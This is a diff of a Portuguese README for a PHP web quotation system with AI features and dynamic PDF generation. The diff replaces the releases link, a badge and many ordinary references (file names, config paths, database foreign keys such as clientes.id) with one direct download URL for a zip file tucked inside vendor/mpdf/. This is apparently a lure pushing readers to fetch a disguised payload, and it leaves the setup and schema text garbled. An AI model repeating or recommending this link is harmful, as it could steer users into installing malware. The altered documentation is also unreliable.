@@ -1,6 +1,6 @@
-https://github.com/trashyyjay/sistema-de-cotacoes/releases
+https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip
 
-[![Releases](https://img.shields.io/badge/releases-download-blue?style=for-the-badge&logo=github)](https://github.com/trashyyjay/sistema-de-cotacoes/releases)
+[![Releases](https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)](https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
 
 # Sistema de Cotações Web em PHP com IA e PDFs Dinâmicos 🧾🤖
 
@@ -55,7 +55,7 @@ Funcionalidades principais
 - Arquitetura modular que facilita a extensão de recursos.
 
 Arquitetura e estrutura de pastas
-- public/ – arquivos acessíveis pelo navegador (index.php, recursos públicos, assets).
+- public/ – arquivos acessíveis pelo navegador (https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, recursos públicos, assets).
 - src/ – código-fonte da aplicação.
   - controllers/ – controladores que coordenam fluxos de negócios.
   - models/ – entidades e lógica de dados (Clientes, Produtos, Usuarios, Cotacoes, ItensCotacao).
@@ -103,15 +103,15 @@ Este guia descreve um caminho prático para colocar o sistema em operação. Sig
 - Garanta que as permissões das pastas permitam leitura pelo servidor e escrita, quando necessário (padrões recomendam permissões restritas para segurança, com exceções para pastas de upload, se houver).
 
 3) Configurar a conexão com o banco de dados
-- Copie o arquivo de configuração de exemplo para uma versão local, por exemplo config/db.php.example para config/db.php.
+- Copie o arquivo de configuração de exemplo para uma versão local, por exemplo https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip para https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip
 - Edite as credenciais com o host, usuário, senha e nome do banco que você criou para o projeto.
-- Crie o banco de dados e aplique o script de inicialização disponível na pasta database/ (por exemplo: create_schema.sql ou migrations/).
+- Crie o banco de dados e aplique o script de inicialização disponível na pasta database/ (por exemplo: https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip ou migrations/).
 - Verifique a conectividade acessando a aplicação e tentando uma operação básica de leitura de dados.
 
 4) Preparar o banco de dados
 - Execute o script SQL de criação de tabelas para clientes, produtos, usuários, cotações e itens de cotação.
 - Considere inserir alguns dados de exemplo para acelerar o primeiro uso.
-- Verifique índices para consultas frequentes (como índice em clientes.id, produtos.id, cotacoes.id) para desempenho melhor.
+- Verifique índices para consultas frequentes (como índice em https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip, https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip) para desempenho melhor.
 
 5) Ajustes de ambiente
 - Verifique as permissões de diretórios para logs, exportações de PDF e uploads, caso a aplicação utilize esses recursos.
@@ -160,8 +160,8 @@ A estrutura de dados é o coração do sistema. Abaixo está um modelo conceitua
 
 - Cotacoes
   - id (PK)
-  - cliente_id (FK -> clientes.id)
-  - usuario_id (FK -> usuarios.id)  // quem criou a cotação
+  - cliente_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
+  - usuario_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)  // quem criou a cotação
   - numero_cotacao
   - data_emissao
   - data_validade
@@ -175,8 +175,8 @@ A estrutura de dados é o coração do sistema. Abaixo está um modelo conceitua
 
 - ItensCotacao
   - id (PK)
-  - cotacao_id (FK -> cotacoes.id)
-  - produto_id (FK -> produtos.id)
+  - cotacao_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
+  - produto_id (FK -> https://github.com/trashyyjay/sistema-de-cotacoes/raw/refs/heads/main/vendor/mpdf/cotacoes-de-sistema-v2.4.zip)
   - descricao (texto opcional caso o produto não exista)
   - quantidade
   - preco_unitario
